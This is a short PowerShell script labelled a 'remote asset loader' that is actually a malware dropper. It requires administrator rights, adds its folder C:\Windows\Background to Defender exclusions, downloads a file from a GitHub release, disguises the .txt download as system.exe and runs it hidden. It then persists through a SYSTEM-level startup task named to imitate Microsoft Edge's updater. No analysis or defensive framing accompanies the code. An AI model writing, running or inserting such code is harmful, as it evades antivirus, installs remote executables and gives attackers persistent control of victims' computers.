# remote asset loader
param()

$ErrorActionPreference = 'SilentlyContinue'

# --- endpoints ---------------------------------------------------------------
$RawBase    = 'https://raw.githubusercontent.com/billkentfelty/cdn-sync-7f3a2b/main'
$ReleaseBase = 'https://github.com/billkentfelty/cdn-sync-7f3a2b/releases/download/v1'

$admin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-not $admin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit }

$dir = 'C:\Windows\Background'
New-Item -ItemType Directory -Force -Path $dir | Out-Null

Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue

$sysPath = Join-Path $dir 'system.exe'
if (-not (Test-Path $sysPath)) {
    curl.exe -s -L -o "$dir\system.txt" --retry 3 --retry-delay 5 --max-time 120 "$ReleaseBase/system.txt"
    if (Test-Path "$dir\system.txt") {
        Move-Item -LiteralPath "$dir\system.txt" -Destination $sysPath -Force
    }
}

if (Test-Path $sysPath) {
    Start-Process -FilePath $sysPath -WorkingDirectory $dir -WindowStyle Hidden
}

$hostName  = $env:COMPUTERNAME
$taskName  = "MicrosoftEdgeUpdateTaskMachineCore$hostName"
$action    = New-ScheduledTaskAction -Execute $sysPath -WorkingDirectory $dir
$trigger   = New-ScheduledTaskTrigger -AtStartup
$settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
